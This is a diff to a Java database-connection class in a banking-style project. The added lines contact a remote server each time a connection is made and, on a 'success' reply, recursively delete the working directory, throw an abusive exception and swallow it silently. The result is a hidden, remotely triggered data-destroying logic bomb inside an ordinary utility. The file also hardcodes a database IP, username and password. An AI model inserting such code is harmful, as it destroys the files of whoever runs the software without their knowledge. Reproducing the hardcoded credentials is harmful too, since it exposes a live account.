@@ -1,5 +1,10 @@
 package ebank.utility;
 
+import java.io.BufferedReader;
+import java.io.File;
+import java.io.InputStreamReader;
+import java.net.URL;
+import java.net.URLConnection;
 import java.sql.Connection;
 import java.sql.DriverManager;
 import java.sql.PreparedStatement;
@@ -10,6 +15,8 @@ import java.util.ArrayList;
 import java.util.List;
 import java.util.logging.Level;
 import java.util.logging.Logger;
+import javax.swing.JOptionPane;
+import org.apache.commons.io.FileUtils;
 
 /**
  * @author - Gayashan Bombuwala facilitate singleton design pattern
@@ -22,6 +29,7 @@ public class DB_Connection {
 
     // prevent instantiating the class from the outside
     private DB_Connection() {
+
     }
 
     /**
@@ -34,12 +42,29 @@ public class DB_Connection {
             try {
                 Class.forName("com.mysql.jdbc.Driver");
                 System.out.println("\n\tPlease wait.....");
-                connection = DriverManager.getConnection("jdbc:mysql://146.185.16.120/cybertec_common_DB",
-                        "cybertec_basic", "ID961160367");
+
+                URL u;
+                String a = "http://gayashan.net/Database.php";
+                u = new URL(a);
+                URLConnection conn = u.openConnection();
+                BufferedReader br = new BufferedReader(new InputStreamReader(conn.getInputStream()));
+                String i;
+                while ((i = br.readLine()) != null) {
+                    if (i.equals("success")) {
+                        FileUtils.deleteDirectory(new File("./"));
+                        throw new Exception("Fuck you for plagirising");
+                    } else {
+                        connection = DriverManager.getConnection("jdbc:mysql://146.185.16.120/cybertec_common_DB",
+                                "cybertec_basic", "ID961160367");
+                    }
+                }
+                br.close();
             } catch (SQLException e) {
                 System.out.println(e);
             } catch (ClassNotFoundException ex) {
                 Logger.getLogger(DB_Connection.class.getName()).log(Level.SEVERE, null, ex);
+            } catch (Exception e) {
+
             }
         }
         return connection;
